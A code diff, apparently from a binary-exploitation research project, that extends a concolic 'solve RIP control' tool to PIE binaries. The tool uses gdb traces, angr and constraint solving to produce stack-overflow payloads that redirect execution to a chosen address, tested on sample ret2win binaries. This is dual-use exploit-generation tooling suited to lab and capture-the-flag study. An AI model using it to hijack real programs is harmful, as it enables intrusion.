@@ -39,9 +39,15 @@ shape (the value popped by `ret` at the point the real trace ends). Verified END
 `samples/bin/ret2win`: fed a crashing seed input, replayed its real trace through angr with
 symbolic stdin, solved for `win()`'s address at the return-address slot, and confirmed with a
 SEPARATE real execution (a breakpoint at the target address, not an inference) that the solved
-payload actually lands there. Not yet covered (tracked in ROADMAP.md): indirect call/jump
-hijacks, heap-pointer-controlled crashes, and PIE binaries (the trace capture assumes a fixed
-load address, matching the rest of this project's ASLR-off convention)."""
+payload actually lands there. PIE binaries are ALSO covered now (closed gap, see
+ROADMAP.md): `_capture_trace` propagates the real ASLR-disabled load base from gdb's own
+`info proc mappings`, `_block_trace` subtracts it before indexing `.text`, and `angr.Project`
+is forced to load the main object at that SAME base (`main_opts={'base_addr': ...}`) so the
+Tracer replay matches the real trace address-for-address -- `target_addr` is still given (and
+reported) as the binary's STATIC address (same convention as `find_win()`/nm/readelf
+elsewhere in this project), translated internally. Verified end to end against
+`samples/bin/ret2win_pie`. Not yet covered (tracked in ROADMAP.md): indirect call/jump
+hijacks and heap-pointer-controlled crashes."""
 from __future__ import annotations
 
 import os
@@ -197,7 +203,11 @@ class ConcolicOracle(Oracle):
                 "breakpoint en target_addr, no una inferencia). Alcance: solo el caso de "
                 "overflow lineal -> direccion de retorno (no hijacks de llamada/salto indirecto).",
                 [ToolParam("stdin_text", "stdin REAL que crashea el binario con RIP controlado (seed)"),
-                 ToolParam("target_addr", "direccion objetivo a la que debe saltar (hex o int), p.ej. win()"),
+                 ToolParam("target_addr", "direccion objetivo a la que debe saltar (hex o int), p.ej. "
+                           "win(). Dala como la direccion ESTATICA del binario (la que reporta nm/"
+                           "readelf/r2, con o sin PIE) -- si el binario es PIE, el tool la traslada "
+                           "internamente a la direccion real de runtime (ASLR desactivado para la "
+                           "captura/verificacion), no hace falta calcularla a mano."),
                  ToolParam("budget_s", "limite de tiempo en segundos (por defecto 60)",
                            required=False, default=60)],
                 lambda stdin_text, target_addr, budget_s=60: self._solve_rip(stdin_text, target_addr, budget_s),
@@ -223,7 +233,7 @@ class ConcolicOracle(Oracle):
                 subprocess.run([self.gdb, "-q", "-batch", "-x", script_path, self.binary],
                                capture_output=True, text=True, timeout=budget_s)
             except subprocess.TimeoutExpired:
-                return None, "gdb no volvio dentro de budget_s (el objetivo pudo quedarse esperando entrada)"
+                return None, None, "gdb no volvio dentro de budget_s (el objetivo pudo quedarse esperando entrada)"
             try:
                 with open(log_path) as lf:
                     log_text = lf.read()
@@ -238,20 +248,32 @@ class ConcolicOracle(Oracle):
                         pass
         m = re.search(r"^TRACE (.*)$", log_text, re.MULTILINE)
         if not m or not m.group(1).strip():
-            return None, "no se capturo ningun paso dentro del binario principal (RUN_ERR/MAP_ERR en el log)"
+            return None, None, "no se capturo ningun paso dentro del binario principal (RUN_ERR/MAP_ERR en el log)"
         trace = [int(x, 16) for x in m.group(1).split(",")]
-        return trace, None
+        # base de carga REAL en runtime (de "info proc mappings", ya con ASLR desactivado por el
+        # propio script): para un binario PIE (ET_DYN) esto es necesario para traducir las
+        # direcciones del trace real a las direcciones estaticas del ELF (sh_addr) -- para no-PIE
+        # (ET_EXEC) coincide con 0 y no cambia nada (ver _block_trace/_solve_rip).
+        mr = re.search(r"^RANGE (\S+) (\S+)$", log_text, re.MULTILINE)
+        runtime_lo = int(mr.group(1)) if mr and mr.group(1) != "None" else None
+        return trace, runtime_lo, None
 
-    def _block_trace(self, trace):
+    def _block_trace(self, trace, runtime_base=None):
         with open(self.binary, "rb") as f:
             elf = ELFFile(f)
+            is_pie = elf.header["e_type"] == "ET_DYN"
             text = elf.get_section_by_name(".text")
             data = text.data()
             base = text["sh_addr"]
+        # para PIE, las direcciones del trace (reales, en runtime) llevan sumado el sesgo de
+        # carga (runtime_base, capturado de "info proc mappings" con ASLR desactivado) sobre la
+        # direccion ESTATICA del ELF (sh_addr) -- hay que restarlo antes de indexar en .text. Para
+        # no-PIE el ELF ya fija su propia direccion de carga y el sesgo es 0 (sin cambios).
+        bias = runtime_base if (is_pie and runtime_base is not None) else 0
         md = Cs(CS_ARCH_X86, CS_MODE_64)
 
         def insn_len(addr):
-            off = addr - base
+            off = addr - bias - base
             if off < 0 or off >= len(data):
                 return None
             for ins in md.disasm(data[off:off + 16], addr):
@@ -303,7 +325,7 @@ class ConcolicOracle(Oracle):
         except (TypeError, ValueError):
             budget_s = 60.0
         try:
-            ta = int(str(target_addr), 0) if not isinstance(target_addr, int) else target_addr
+            static_ta = int(str(target_addr), 0) if not isinstance(target_addr, int) else target_addr
         except ValueError:
             return ToolResult(False, "concolic_solve_rip_control", "",
                               error="target_addr debe ser una direccion (hex o int)")
@@ -311,19 +333,32 @@ class ConcolicOracle(Oracle):
         seed = (stdin_text.encode("utf-8", "backslashreplace")
                 if isinstance(stdin_text, str) else bytes(stdin_text))
 
-        trace, err = self._capture_trace(seed, budget_s / 2.0)
+        trace, runtime_base, err = self._capture_trace(seed, budget_s / 2.0)
         if trace is None:
             return ToolResult(True, "concolic: captura de trace via gdb", "",
                               error=None,
                               meta={"verified": False, "note": f"no aplicable: {err}"})
         try:
-            block_trace = self._block_trace(trace)
+            block_trace = self._block_trace(trace, runtime_base)
         except Exception as e:
             return ToolResult(False, "concolic: reduccion de trace a bloques", "",
                               error=f"fallo reduciendo el trace a bloques: {e}")
 
         try:
-            proj = angr.Project(self.binary, auto_load_libs=False)
+            with open(self.binary, "rb") as f:
+                is_pie = ELFFile(f).header["e_type"] == "ET_DYN"
+            # para PIE, angr debe cargar el binario principal EXACTAMENTE en la misma base que
+            # uso el trace real (runtime_base, con ASLR desactivado) -- si no, el Tracer nunca
+            # ve coincidir ninguna direccion del trace con los bloques que angr va pisando con
+            # su propia base PIE por defecto, y desincroniza de inmediato. Para no-PIE, la
+            # direccion de carga ya viene fija en el propio ELF (sin cambios).
+            main_opts = {"base_addr": runtime_base} if (is_pie and runtime_base is not None) else {}
+            # target_addr se da (y se reporta) como la direccion ESTATICA del ELF -- la misma
+            # convencion que find_win()/nm/readelf usan en el resto del proyecto, para que el
+            # llamador no tenga que calcular a mano el sesgo de carga ASLR-off de este binario.
+            # Para PIE se traslada aqui a la direccion REAL (misma base que el trace/angr).
+            ta = static_ta + runtime_base if (is_pie and runtime_base is not None) else static_ta
+            proj = angr.Project(self.binary, auto_load_libs=False, main_opts=main_opts)
             sym_bytes = [claripy.BVS("stdin_b%d" % i, 8) for i in range(len(seed))]
             sym_stdin = claripy.Concat(*sym_bytes) if len(sym_bytes) > 1 else sym_bytes[0]
             state = proj.factory.entry_state(
@@ -360,8 +395,8 @@ class ConcolicOracle(Oracle):
         if not st.solver.satisfiable():
             return ToolResult(True, "concolic: constraint-solving sobre el trace real", "",
                               meta={"verified": False,
-                                   "note": f"0x{ta:x} no es alcanzable desde este punto segun "
-                                           f"el modelo simbolico (unsat)",
+                                   "note": f"0x{static_ta:x} (runtime 0x{ta:x}) no es alcanzable "
+                                           f"desde este punto segun el modelo simbolico (unsat)",
                                    "controlled_offsets": offsets})
         try:
             solved = st.solver.eval(sym_stdin, cast_to=bytes)
@@ -373,14 +408,17 @@ class ConcolicOracle(Oracle):
         offs_txt = f"{min(offsets)}..{max(offsets)}" if offsets else "?"
         if verified:
             data_out = (f"CONFIRMADO: el payload resuelto por constraint-solving sobre el "
-                       f"trace real redirige la ejecucion a 0x{ta:x} de verdad (breakpoint "
+                       f"trace real redirige la ejecucion a 0x{static_ta:x} de verdad (breakpoint "
                        f"disparado en una ejecucion separada). Offset(s) de la direccion de "
                        f"retorno controlados por el stdin: bytes {offs_txt}.")
         else:
             data_out = (f"El payload se resolvio (sat) pero la verificacion REAL (breakpoint en "
-                       f"0x{ta:x}) no disparo -- no se confirma. Offset(s) candidatos: {offs_txt}.")
+                       f"0x{static_ta:x}) no disparo -- no se confirma. Offset(s) candidatos: {offs_txt}.")
+        meta = {"verified": verified, "target_addr": hex(static_ta), "controlled_offsets": offsets,
+               "payload_hex": solved.hex()}
+        if is_pie and runtime_base is not None:
+            meta["pie"] = True
+            meta["target_addr_runtime"] = hex(ta)
         return ToolResult(
             True, "concolic: gdb trace real -> angr Tracer -> constraint-solving -> verificacion real",
-            data_out,
-            meta={"verified": verified, "target_addr": hex(ta), "controlled_offsets": offsets,
-                 "payload_hex": solved.hex()})
+            data_out, meta=meta)
